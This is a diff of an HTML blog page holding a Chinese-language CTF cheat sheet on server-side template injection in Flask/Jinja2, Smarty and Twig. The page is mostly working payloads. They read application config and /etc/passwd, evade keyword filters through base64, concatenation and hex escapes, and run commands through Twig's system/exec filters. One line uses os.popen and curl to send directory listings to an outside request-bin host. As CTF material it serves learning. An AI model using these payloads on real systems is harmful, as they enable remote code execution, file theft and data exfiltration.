@@ -575,7 +575,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="CTF-SSTI-服务器模板注入"><a href="#CTF-SSTI-服务器模板注入" class="headerlink" title="CTF SSTI(服务器模板注入)"></a><strong>CTF SSTI(服务器模板注入)</strong></h1><h3 id="一丶基本判断"><a href="#一丶基本判断" class="headerlink" title="一丶基本判断"></a><strong>一丶基本判断</strong></h3><p><img src="https://img2018.cnblogs.com/blog/1270588/202001/1270588-20200116203917086-1704538409.png"></p>
+                <h1 id="CTF-SSTI-服务器模板注入"><a href="#CTF-SSTI-服务器模板注入" class="headerlink" title="CTF SSTI(服务器模板注入)"></a><strong>CTF SSTI(服务器模板注入)</strong></h1><h3 id="一丶基本判断"><a href="#一丶基本判断" class="headerlink" title="一丶基本判断"></a><strong>一丶基本判断</strong></h3><p><img src="https://i.loli.net/2021/07/28/hYPU4l68D7xAg9Z.png"></p>
 <hr>
 <h3 id="二丶渲染模板（flask-jinja）"><a href="#二丶渲染模板（flask-jinja）" class="headerlink" title="二丶渲染模板（flask/jinja）"></a><strong>二丶渲染模板（flask/jinja）</strong></h3><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p>
 <table>
@@ -617,13 +617,13 @@
 <p><code>{{config}}</code>可以获取当前设置，如果题目类似<code>app.config ['FLAG'] = os.environ.pop（'FLAG'）</code>，那可以直接访问<code>{{config['FLAG']}}</code>或者<code>{{config.FLAG}}</code>得到flag</p>
 </li>
 <li><p><strong>self</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\{\{self\}\} ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">\{\{self.__dict__._TemplateReference__context.config\}\} ⇒ 同样可以找到config</span><br></pre></td></tr></tbody></table></figure></li>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{self\}\} ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">{{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config</span><br></pre></td></tr></tbody></table></figure></li>
 <li><p><strong>[]  ()  “”</strong></p>
 <p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br> <code>{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']}}</code></p>
 </li>
 <li><p>url_for,g,request,namespace,lipsum,range,session,dict,get_flashed_message,config</p>
 <p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\{\{url_for.__globals__['current_app'].config.FLAG\}\}</span><br><span class="line">\{\{get_flashed_messages.__globals__['current_app'].config.FLAG\}\}</span><br><span class="line">\{\{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']\}\}</span><br></pre></td></tr></tbody></table></figure></li>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">{{url_for.__globals__['current_app'].config.FLAG}}</span><br><span class="line">{{get_flashed_messages.__globals__['current_app'].config.FLAG}}</span><br><span class="line">{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}</span><br></pre></td></tr></tbody></table></figure></li>
 </ul>
 <h5 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a><strong>常用绕过</strong></h5><ol>
 <li><p>以下表示法可用于访问对象的属性：</p>
@@ -645,7 +645,7 @@
 </li>
 <li><p>过滤_</p>
 <p>利用<code>request.args</code>属性</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\{\{  ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() \}\}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__`</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{  ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__`</span><br></pre></td></tr></tbody></table></figure>
 
 <p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p>
 </li>
@@ -654,21 +654,21 @@
 <li>base64编码绕过<br> <code>__getattribute__</code>使用实例访问属性时,调用该方法</li>
 </ul>
 <p>​      例如被过滤掉<code>__class__</code>关键词</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\{\{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()\}\}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}</span><br></pre></td></tr></tbody></table></figure>
 
 <ul>
 <li><p>字符串拼接绕过</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\{\{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()\}\}</span><br><span class="line">\{\{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]\}\}</span><br></pre></td></tr></tbody></table></figure></li>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}</span><br><span class="line">{{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]}}</span><br></pre></td></tr></tbody></table></figure></li>
 </ul>
 </li>
 <li><p>过滤  {   {</p>
 <p>使用{ % if … %}1{ % endif  % }，例如</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;')\%\}1\{\% endif \%\}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;')%}1{% endif %}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p'%\}1\{% endif%\}</span><br></pre></td></tr></tbody></table></figure></li>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p'%}1{% endif%}</span><br></pre></td></tr></tbody></table></figure></li>
 <li><p>引号内十六进制绕过</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\{\{"".__class__\}\}</span><br><span class="line">\{\{""["\x5f\x5fclass\x5f\x5f"]\}\}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{"".__class__}}</span><br><span class="line">{{""["\x5f\x5fclass\x5f\x5f"]}}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>_<code>是</code>\x5f<code>，</code>.<code>是</code>\x2E</p>
 </li>
@@ -686,7 +686,7 @@
 <ul>
 <li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li>
 </ul>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\{\%set udl=dict(a=pc,c=c).values()|join \%\}      # uld=%c</span><br><span class="line">\{\%set i1=dict(a=i1,c=udl%(99)).values()|join \%\}</span><br></pre></td></tr></tbody></table></figure></li>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{%set udl=dict(a=pc,c=c).values()|join %}      # uld=%c</span><br><span class="line">{%set i1=dict(a=i1,c=udl%(99)).values()|join %}</span><br></pre></td></tr></tbody></table></figure></li>
 <li><p>+被过滤，无法拼接字符串</p>
 </li>
 </ol>
@@ -711,10 +711,10 @@
 <p>新版本失效<br> <code>{self::getStreamVariable("file:///etc/passwd")}</code></p>
 <hr>
 <h3 id="四丶twig"><a href="#四丶twig" class="headerlink" title="四丶twig"></a><strong>四丶twig</strong></h3><p><strong>文件读取</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\{\{'/etc/passwd'|file_excerpt(1,30)\}\}</span><br><span class="line"></span><br><span class="line">\{\{app.request.files.get(1).__construct('/etc/passwd','')\}\}</span><br><span class="line">\{\{app.request.files.get(1).openFile.fread(99)\}\}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">{{'/etc/passwd'|file_excerpt(1,30)}}</span><br><span class="line"></span><br><span class="line">{{app.request.files.get(1).__construct('/etc/passwd','')\}\}</span><br><span class="line">{{app.request.files.get(1).openFile.fread(99)\}\}</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>rce</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\{\{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("id")\}\}</span><br><span class="line"></span><br><span class="line">\{\{['cat /etc/passwd']|filter('system')\}\}</span><br><span class="line"></span><br><span class="line">POST /subscribe?0=cat+/etc/passwd HTTP/1.1</span><br><span class="line">\{\{app.request.query.filter(0,0,1024,{'options':'system'})\}\}</span><br></pre></td></tr></tbody></table></figure></li>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">{{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("id")}}</span><br><span class="line"></span><br><span class="line">{{['cat /etc/passwd']|filter('system')}}</span><br><span class="line"></span><br><span class="line">POST /subscribe?0=cat+/etc/passwd HTTP/1.1</span><br><span class="line">{{app.request.query.filter(0,0,1024,{'options':'system'})}}</span><br></pre></td></tr></tbody></table></figure></li>
 </ol>
 <hr>
 
